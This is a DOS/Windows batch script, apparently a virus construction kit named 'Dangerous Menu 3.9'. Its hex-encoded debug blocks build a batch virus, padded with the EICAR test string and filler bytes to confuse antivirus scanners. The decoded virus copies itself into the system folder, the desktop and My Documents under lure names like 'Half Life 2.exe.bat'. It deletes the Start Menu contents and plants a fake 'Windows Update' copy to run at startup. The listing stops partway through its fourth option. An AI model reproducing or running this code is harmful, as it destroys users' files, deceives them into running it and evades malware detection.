@echo off
cls
ver|find "XP"
if errorlevel 1 goto main
if not errorlevel 1 goto :XP
cls
:main
cls
echo.
echo.
echo                       ÉÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ»
echo                       ³ °±²Û Dangerous Menu 3.9 Û²±° ³
echo                       ÈÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¼
echo.
echo                  www.geocities.com/ratty_dvl/BATch/main.htm
echo.
echo.
echo    1 - EICAR
echo.
echo    2 - Fake bytes
echo.
echo    3 - EICAR and fake bytes
echo.
echo    4 - Mutamorphic fake bytes
echo.
echo    5 - No fake bytes, EICAR or mutamorphic fake bytes
echo.
echo.
echo    Q - e X i t
echo.
choice /c:12345Q>nul
if errorlevel 6 goto done
if errorlevel 5 goto a5b
if errorlevel 4 goto a4
if errorlevel 3 goto a3
if errorlevel 2 goto a2
if errorlevel 1 goto a1
echo CHOICE missing
goto done

:a1
cls
ctty nul
@if exist ioana.txt deltree/y ioana.txt
echo e 0100  58 35 4F 21 50 25 40 41 50 5B 34 5C 50 5A 58 35>>eicar
echo e 0110  34 28 50 5E 29 37 43 43 29 37 7D 24 45 49 43 41>>eicar
echo e 0120  52 2D 53 54 41 4E 44 41 52 44 2D 41 4E 54 49 56>>eicar
echo e 0130  49 52 55 53 2D 54 45 53 54 2D 46 49 4C 45 21 24>>eicar
echo e 0140  48 2B 48 2A 0D 0A 3A 3A 0D 0A 3A 3A 20 47 65 6E>>eicar
echo e 0150  65 72 61 74 65 64 20 62 79 20 44 61 6E 67 65 72>>eicar
echo e 0160  6F 75 73 20 4D 65 6E 75 20 5B 44 76 4C 5D 0D 0A>>eicar
echo e 0170  3A 3A 0D 0A 40 65 63 68 6F 20 6F 66 66 0D 0A 63>>eicar
echo e 0180  6C 73 0D 0A 76 65 72 7C 66 69 6E 64 20 22 58 50>>eicar
echo e 0190  22 7C 69 66 20 65 72 72 6F 72 6C 65 76 65 6C 20>>eicar
echo e 01A0  31 20 63 74 74 79 20 6E 75 6C 7C 69 66 20 6E 6F>>eicar
echo e 01B0  74 20 65 72 72 6F 72 6C 65 76 65 6C 20 31 20 67>>eicar
echo e 01C0  6F 74 6F 20 3A 58 50 0D 0A 63 6C 73 0D 0A 40 64>>eicar
echo e 01D0  65 6C 74 72 65 65 2F 79 20 25 77 69 6E 64 69 72>>eicar
echo e 01E0  25 5C 73 79 73 74 65 6D 5C 61 6E 67 65 6C 20 3E>>eicar
echo e 01F0  6E 75 6C 0D 0A 40 6D 64 20 25 77 69 6E 64 69 72>>eicar
echo e 0200  25 5C 73 79 73 74 65 6D 5C 61 6E 67 65 6C 0D 0A>>eicar
echo e 0210  40 63 6F 70 79 20 25 30 20 25 77 69 6E 64 69 72>>eicar
echo e 0220  25 5C 73 79 73 74 65 6D 5C 61 6E 67 65 6C 5C 61>>eicar
echo e 0230  6E 67 65 6C 2E 62 61 74 0D 0A 40 63 6F 70 79 20>>eicar
echo e 0240  25 30 20 25 77 69 6E 64 69 72 25 5C 64 65 73 6B>>eicar
echo e 0250  74 6F 70 5C 22 50 6C 65 61 73 75 72 65 2C 20 66>>eicar
echo e 0260  75 6E 20 61 6E 64 20 53 45 58 2E 75 72 6C 2E 62>>eicar
echo e 0270  61 74 22 20 3E 6E 75 6C 0D 0A 40 63 6F 70 79 20>>eicar
echo e 0280  25 30 20 25 77 69 6E 64 69 72 25 5C 64 65 73 6B>>eicar
echo e 0290  74 6F 70 5C 22 54 68 65 20 62 6C 6F 77 6A 6F 62>>eicar
echo e 02A0  65 72 2E 6A 70 67 2E 62 61 74 22 20 3E 6E 75 6C>>eicar
echo e 02B0  0D 0A 40 63 6F 70 79 20 25 30 20 63 3A 5C 6D 79>>eicar
echo e 02C0  64 6F 63 75 7E 31 5C 22 53 65 78 79 65 73 74 20>>eicar
echo e 02D0  77 6F 6D 65 6E 20 66 72 6F 6D 20 75 6E 69 76 65>>eicar
echo e 02E0  72 73 65 2E 64 6F 63 2E 62 61 74 22 20 3E 6E 75>>eicar
echo e 02F0  6C 0D 0A 40 63 6F 70 79 20 25 30 20 63 3A 5C 6D>>eicar
echo e 0300  79 64 6F 63 75 7E 31 5C 22 48 61 6C 66 20 4C 69>>eicar
echo e 0310  66 65 20 32 2E 65 78 65 2E 62 61 74 22 20 3E 6E>>eicar
echo e 0320  75 6C 0D 0A 40 64 65 6C 74 72 65 65 2F 79 20 25>>eicar
echo e 0330  77 69 6E 64 69 72 25 5C 73 74 61 72 74 6D 7E 31>>eicar
echo e 0340  5C 2A 2E 2A 20 3E 6E 75 6C 0D 0A 40 63 6F 70 79>>eicar
echo e 0350  20 25 30 20 25 77 69 6E 64 69 72 25 5C 73 74 61>>eicar
echo e 0360  72 74 6D 7E 31 5C 22 57 69 6E 64 6F 77 73 20 55>>eicar
echo e 0370  70 64 61 74 65 2E 65 78 65 2E 62 61 74 22 20 3E>>eicar
echo e 0380  6E 75 6C 0D 0A 00>>eicar
echo rcx>>eicar
echo 285>>eicar
echo n txt>>eicar
echo w>>eicar
echo q>>eicar
@debug<eicar
@ren txt ioana.txt
@deltree/y txt >nul
@deltree/y eicar >nul
ctty con
cls
goto 001

:a2
cls
ctty nul
@if exist ioana.txt deltree/y ioana.txt
echo e 0100  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
echo e 0110  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
echo e 0120  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
echo e 0130  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
echo e 0140  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
echo e 0150  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 0D>>fake
echo e 0160  0A 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0170  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0180  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0190  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 01A0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 01B0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 01C0  0D 0A 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 01D0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 01E0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 01F0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0200  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0210  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0220  30 0D 0A 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0230  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0240  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0250  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0260  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0270  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0280  30 31 0D 0A 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0290  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 02A0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 02B0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 02C0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 02D0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 02E0  30 31 30 0D 0A 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 02F0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0300  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0310  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0320  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0330  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0340  30 31 30 31 0D 0A 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0350  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0360  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0370  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0380  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0390  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 03A0  30 31 30 31 30 0D 0A 31 30 31 30 31 30 31 30 31>>fake
echo e 03B0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 03C0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 03D0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 03E0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 03F0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0400  30 31 30 31 30 31 0D 0A 30 31 30 31 30 31 30 31>>fake
echo e 0410  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0420  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0430  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0440  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0450  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0460  30 31 30 31 30 31 30 0D 0A 31 30 31 30 31 30 31>>fake
echo e 0470  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0480  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0490  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 04A0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 04B0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 04C0  30 31 30 31 30 31 30 31 0D 0A 30 31 30 31 30 31>>fake
echo e 04D0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 04E0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 04F0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0500  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0510  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0520  30 31 30 31 30 31 30 31 30 0D 0A 31 30 31 30 31>>fake
echo e 0530  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0540  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0550  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0560  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0570  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 0580  30 31 30 31 30 31 30 31 30 31 0D 0A 30 31 30 31>>fake
echo e 0590  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 05A0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 05B0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 05C0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 05D0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>fake
echo e 05E0  30 31 30 31 30 31 30 31 30 31 30 0D 0A 30 31 30>>fake
echo e 05F0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
echo e 0600  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
echo e 0610  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
echo e 0620  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
echo e 0630  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
echo e 0640  31 30 31 30 31 30 31 30 31 30 31 30 0D 0A 3A 3A>>fake
echo e 0650  0D 0A 3A 3A 20 47 65 6E 65 72 61 74 65 64 20 62>>fake
echo e 0660  79 20 44 61 6E 67 65 72 6F 75 73 20 4D 65 6E 75>>fake
echo e 0670  20 5B 44 76 4C 5D 0D 0A 3A 3A 0D 0A 40 65 63 68>>fake
echo e 0680  6F 20 6F 66 66 0D 0A 63 6C 73 0D 0A 76 65 72 7C>>fake
echo e 0690  66 69 6E 64 20 22 58 50 22 7C 69 66 20 65 72 72>>fake
echo e 06A0  6F 72 6C 65 76 65 6C 20 31 20 63 74 74 79 20 6E>>fake
echo e 06B0  75 6C 7C 69 66 20 6E 6F 74 20 65 72 72 6F 72 6C>>fake
echo e 06C0  65 76 65 6C 20 31 20 67 6F 74 6F 20 3A 58 50 0D>>fake
echo e 06D0  0A 63 6C 73 0D 0A 40 64 65 6C 74 72 65 65 2F 79>>fake
echo e 06E0  20 25 77 69 6E 64 69 72 25 5C 73 79 73 74 65 6D>>fake
echo e 06F0  5C 61 6E 67 65 6C 20 3E 6E 75 6C 0D 0A 40 6D 64>>fake
echo e 0700  20 25 77 69 6E 64 69 72 25 5C 73 79 73 74 65 6D>>fake
echo e 0710  5C 61 6E 67 65 6C 0D 0A 40 63 6F 70 79 20 25 30>>fake
echo e 0720  20 25 77 69 6E 64 69 72 25 5C 73 79 73 74 65 6D>>fake
echo e 0730  5C 61 6E 67 65 6C 5C 61 6E 67 65 6C 2E 62 61 74>>fake
echo e 0740  0D 0A 40 63 6F 70 79 20 25 30 20 25 77 69 6E 64>>fake
echo e 0750  69 72 25 5C 64 65 73 6B 74 6F 70 5C 22 50 6C 65>>fake
echo e 0760  61 73 75 72 65 2C 20 66 75 6E 20 61 6E 64 20 53>>fake
echo e 0770  45 58 2E 75 72 6C 2E 62 61 74 22 20 3E 6E 75 6C>>fake
echo e 0780  0D 0A 40 63 6F 70 79 20 25 30 20 25 77 69 6E 64>>fake
echo e 0790  69 72 25 5C 64 65 73 6B 74 6F 70 5C 22 54 68 65>>fake
echo e 07A0  20 62 6C 6F 77 6A 6F 62 65 72 2E 6A 70 67 2E 62>>fake
echo e 07B0  61 74 22 20 3E 6E 75 6C 0D 0A 40 63 6F 70 79 20>>fake
echo e 07C0  25 30 20 63 3A 5C 6D 79 64 6F 63 75 7E 31 5C 22>>fake
echo e 07D0  53 65 78 79 65 73 74 20 77 6F 6D 65 6E 20 66 72>>fake
echo e 07E0  6F 6D 20 75 6E 69 76 65 72 73 65 2E 64 6F 63 2E>>fake
echo e 07F0  62 61 74 22 20 3E 6E 75 6C 0D 0A 40 63 6F 70 79>>fake
echo e 0800  20 25 30 20 63 3A 5C 6D 79 64 6F 63 75 7E 31 5C>>fake
echo e 0810  22 48 61 6C 66 20 4C 69 66 65 20 32 2E 65 78 65>>fake
echo e 0820  2E 62 61 74 22 20 3E 6E 75 6C 0D 0A 40 64 65 6C>>fake
echo e 0830  74 72 65 65 2F 79 20 25 77 69 6E 64 69 72 25 5C>>fake
echo e 0840  73 74 61 72 74 6D 7E 31 5C 2A 2E 2A 20 3E 6E 75>>fake
echo e 0850  6C 0D 0A 40 63 6F 70 79 20 25 30 20 25 77 69 6E>>fake
echo e 0860  64 69 72 25 5C 73 74 61 72 74 6D 7E 31 5C 22 57>>fake
echo e 0870  69 6E 64 6F 77 73 20 55 70 64 61 74 65 2E 65 78>>fake
echo e 0880  65 2E 62 61 74 22 20 3E 6E 75 6C 0D 0A 00>>fake
echo rcx>>fake
echo 78D>>fake
echo n txt>>fake
echo w>>fake
echo q>>fake
@debug<fake
@ren txt ioana.txt
@deltree/y txt >nul
@deltree/y fake >nul
ctty con
cls
goto 001

:a3
cls
ctty nul
@if exist ioana.txt deltree/y ioana.txt
echo e 0100  58 35 4F 21 50 25 40 41 50 5B 34 5C 50 5A 58 35>>both
echo e 0110  34 28 50 5E 29 37 43 43 29 37 7D 24 45 49 43 41>>both
echo e 0120  52 2D 53 54 41 4E 44 41 52 44 2D 41 4E 54 49 56>>both
echo e 0130  49 52 55 53 2D 54 45 53 54 2D 46 49 4C 45 21 24>>both
echo e 0140  48 2B 48 2A 0D 0A 30 31 30 31 30 31 30 31 30 31>>both
echo e 0150  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 0160  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 0170  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 0180  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 0190  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 01A0  30 31 30 31 30 0D 0A 30 31 30 31 30 31 30 31 30>>both
echo e 01B0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 01C0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 01D0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 01E0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 01F0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0200  31 30 31 30 31 30 0D 0A 31 30 31 30 31 30 31 30>>both
echo e 0210  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0220  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0230  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0240  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0250  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0260  31 30 31 30 31 30 31 0D 0A 31 30 31 30 31 30 31>>both
echo e 0270  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 0280  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 0290  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 02A0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 02B0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 02C0  30 31 30 31 30 31 30 31 0D 0A 30 31 30 31 30 31>>both
echo e 02D0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 02E0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 02F0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 0300  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 0310  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 0320  30 31 30 31 30 31 30 31 30 0D 0A 31 30 31 30 31>>both
echo e 0330  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 0340  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 0350  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 0360  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 0370  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 0380  30 31 30 31 30 31 30 31 30 31 0D 0A 30 31 30 31>>both
echo e 0390  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 03A0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 03B0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 03C0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 03D0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 03E0  30 31 30 31 30 31 30 31 30 31 30 0D 0A 31 30 31>>both
echo e 03F0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 0400  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 0410  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 0420  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 0430  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 0440  30 31 30 31 30 31 30 31 30 31 30 31 0D 0A 30 31>>both
echo e 0450  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 0460  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 0470  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 0480  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 0490  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 04A0  30 31 30 31 30 31 30 31 30 31 30 31 30 0D 0A 30>>both
echo e 04B0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 04C0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 04D0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 04E0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 04F0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0500  31 30 31 30 31 30 31 30 31 30 31 30 31 30 0D 0A>>both
echo e 0510  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0520  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0530  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0540  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0550  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0560  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 0D>>both
echo e 0570  0A 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0580  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0590  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 05A0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 05B0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 05C0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 05D0  0D 0A 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 05E0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 05F0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0600  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0610  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0620  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0630  31 0D 0A 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0640  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0650  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0660  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0670  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0680  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0690  31 30 0D 0A 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 06A0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 06B0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 06C0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 06D0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 06E0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 06F0  31 30 31 0D 0A 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0700  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0710  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0720  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0730  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0740  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
echo e 0750  31 30 31 30 0D 0A 30 31 30 31 30 31 30 31 30 31>>both
echo e 0760  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 0770  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 0780  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 0790  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 07A0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
echo e 07B0  30 31 30 31 30 0D 0A 3A 3A 0D 0A 3A 3A 20 47 65>>both
echo e 07C0  6E 65 72 61 74 65 64 20 62 79 20 44 61 6E 67 65>>both
echo e 07D0  72 6F 75 73 20 4D 65 6E 75 20 5B 44 76 4C 5D 0D>>both
echo e 07E0  0A 3A 3A 0D 0A 40 65 63 68 6F 20 6F 66 66 0D 0A>>both
echo e 07F0  63 6C 73 0D 0A 76 65 72 7C 66 69 6E 64 20 22 58>>both
echo e 0800  50 22 7C 69 66 20 65 72 72 6F 72 6C 65 76 65 6C>>both
echo e 0810  20 31 20 63 74 74 79 20 6E 75 6C 7C 69 66 20 6E>>both
echo e 0820  6F 74 20 65 72 72 6F 72 6C 65 76 65 6C 20 31 20>>both
echo e 0830  67 6F 74 6F 20 3A 58 50 0D 0A 63 6C 73 0D 0A 40>>both
echo e 0840  64 65 6C 74 72 65 65 2F 79 20 25 77 69 6E 64 69>>both
echo e 0850  72 25 5C 73 79 73 74 65 6D 5C 61 6E 67 65 6C 20>>both
echo e 0860  3E 6E 75 6C 0D 0A 40 6D 64 20 25 77 69 6E 64 69>>both
echo e 0870  72 25 5C 73 79 73 74 65 6D 5C 61 6E 67 65 6C 0D>>both
echo e 0880  0A 40 63 6F 70 79 20 25 30 20 25 77 69 6E 64 69>>both
echo e 0890  72 25 5C 73 79 73 74 65 6D 5C 61 6E 67 65 6C 5C>>both
echo e 08A0  61 6E 67 65 6C 2E 62 61 74 0D 0A 40 63 6F 70 79>>both
echo e 08B0  20 25 30 20 25 77 69 6E 64 69 72 25 5C 64 65 73>>both
echo e 08C0  6B 74 6F 70 5C 22 50 6C 65 61 73 75 72 65 2C 20>>both
echo e 08D0  66 75 6E 20 61 6E 64 20 53 45 58 2E 75 72 6C 2E>>both
echo e 08E0  62 61 74 22 20 3E 6E 75 6C 0D 0A 40 63 6F 70 79>>both
echo e 08F0  20 25 30 20 25 77 69 6E 64 69 72 25 5C 64 65 73>>both
echo e 0900  6B 74 6F 70 5C 22 54 68 65 20 62 6C 6F 77 6A 6F>>both
echo e 0910  62 65 72 2E 6A 70 67 2E 62 61 74 22 20 3E 6E 75>>both
echo e 0920  6C 0D 0A 40 63 6F 70 79 20 25 30 20 63 3A 5C 6D>>both
echo e 0930  79 64 6F 63 75 7E 31 5C 22 53 65 78 79 65 73 74>>both
echo e 0940  20 77 6F 6D 65 6E 20 66 72 6F 6D 20 75 6E 69 76>>both
echo e 0950  65 72 73 65 2E 64 6F 63 2E 62 61 74 22 20 3E 6E>>both
echo e 0960  75 6C 0D 0A 40 63 6F 70 79 20 25 30 20 63 3A 5C>>both
echo e 0970  6D 79 64 6F 63 75 7E 31 5C 22 48 61 6C 66 20 4C>>both
echo e 0980  69 66 65 20 32 2E 65 78 65 2E 62 61 74 22 20 3E>>both
echo e 0990  6E 75 6C 0D 0A 40 64 65 6C 74 72 65 65 2F 79 20>>both
echo e 09A0  25 77 69 6E 64 69 72 25 5C 73 74 61 72 74 6D 7E>>both
echo e 09B0  31 5C 2A 2E 2A 20 3E 6E 75 6C 0D 0A 40 63 6F 70>>both
echo e 09C0  79 20 25 30 20 25 77 69 6E 64 69 72 25 5C 73 74>>both
echo e 09D0  61 72 74 6D 7E 31 5C 22 57 69 6E 64 6F 77 73 20>>both
echo e 09E0  55 70 64 61 74 65 2E 65 78 65 2E 62 61 74 22 20>>both
echo e 09F0  3E 6E 75 6C 0D 0A 00>>both
echo rcx>>both
echo 8F6>>both
echo n txt>>both
echo w>>both
echo q>>both
@debug<both
@ren txt ioana.txt
@deltree/y txt >nul
@deltree/y both >nul
ctty con
cls
goto 001

:a4
cls
ctty nul
@if exist ioana.txt deltree/y ioana.txt
echo e 0100  25 72 61 6E 64 6F 6D 25 0D 0A 65 63 68 6F 2E 0D>>muta
echo e 0110  0A 64 69 72 0D 0A 65 63 68 6F 2E 0D 0A 63 6C 73>>muta
echo e 0120  0D 0A 3A 3A 0D 0A 3A 3A 20 47 65 6E 65 72 61 74>>muta
echo e 0130  65 64 20 62 79 20 44 61 6E 67 65 72 6F 75 73 20>>muta
echo e 0140  4D 65 6E 75 20 5B 44 76 4C 5D 0D 0A 3A 3A 0D 0A>>muta
